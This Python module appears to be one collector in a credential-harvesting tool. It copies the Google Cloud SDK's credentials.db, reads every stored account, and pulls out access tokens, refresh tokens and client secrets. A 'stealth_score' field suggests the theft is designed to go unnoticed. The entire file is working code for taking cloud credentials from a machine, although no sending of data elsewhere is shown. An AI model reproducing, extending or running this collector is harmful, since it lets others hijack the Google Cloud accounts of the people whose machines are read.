"""Google Cloud SDK credentials.db collector — reads gcloud's SQLite credential store."""

from __future__ import annotations

import json
import os
import shutil
import sqlite3
import tempfile
from typing import List

from ..base import BaseCollector
from .. import CollectorRegistry
from ...types import CollectedToken, DiscoveredToken
from ...secure import secure
from ...platform_utils import gcloud_dir


@CollectorRegistry.register
class GcloudCollector(BaseCollector):
    service = "google"
    source = "gcloud"
    stealth_score = 5

    def _db_path(self):
        return gcloud_dir() / "credentials.db"

    def _safe_read_db(self, db_path):
        """Copy the DB to a temp file before reading (avoids lock issues)."""
        tmp_fd, tmp_path = tempfile.mkstemp(suffix=".db")
        os.close(tmp_fd)
        try:
            shutil.copy2(str(db_path), tmp_path)
            conn = sqlite3.connect(tmp_path)
            try:
                cursor = conn.execute("SELECT account_id, value FROM credentials")
                rows = cursor.fetchall()
            finally:
                conn.close()
            return rows
        finally:
            try:
                os.unlink(tmp_path)
            except OSError:
                pass

    def discover(self) -> List[DiscoveredToken]:
        results = []
        db_path = self._db_path()
        if not db_path.exists():
            return results

        try:
            rows = self._safe_read_db(db_path)
            for account_id, _value in rows:
                results.append(DiscoveredToken(
                    service=self.service,
                    source=self.source,
                    path=str(db_path),
                    account_hint=account_id,
                    stealth_score=self.stealth_score,
                ))
        except Exception as e:
            self._warn(f"Failed to read {db_path}: {e}")

        return results

    def collect(self) -> List[CollectedToken]:
        results = []
        db_path = self._db_path()
        if not db_path.exists():
            return results

        try:
            rows = self._safe_read_db(db_path)
            for account_id, value in rows:
                try:
                    cred_data = json.loads(value)
                except (json.JSONDecodeError, TypeError):
                    self._warn(f"Could not parse credential JSON for {account_id}")
                    continue

                # gcloud stores various credential types
                access_token = cred_data.get("access_token")
                refresh_token = cred_data.get("refresh_token")
                client_id = cred_data.get("client_id")
                client_secret = cred_data.get("client_secret")
                token_uri = cred_data.get("token_uri", "https://oauth2.googleapis.com/token")

                if not access_token and not refresh_token:
                    continue

                results.append(CollectedToken(
                    service=self.service,
                    source=self.source,
                    stealth_score=self.stealth_score,
                    account_id=account_id,
                    username=account_id,
                    access_token=secure(access_token) if access_token else None,
                    refresh_token=secure(refresh_token) if refresh_token else None,
                    client_id=client_id,
                    client_secret=secure(client_secret) if client_secret else None,
                    token_uri=token_uri,
                    scopes=cred_data.get("scopes", []),
                    extra={
                        "type": cred_data.get("type"),
                        "expiry": cred_data.get("token_expiry"),
                    },
                ))
        except Exception as e:
            self._warn(f"Failed to collect from {db_path}: {e}")

        return results
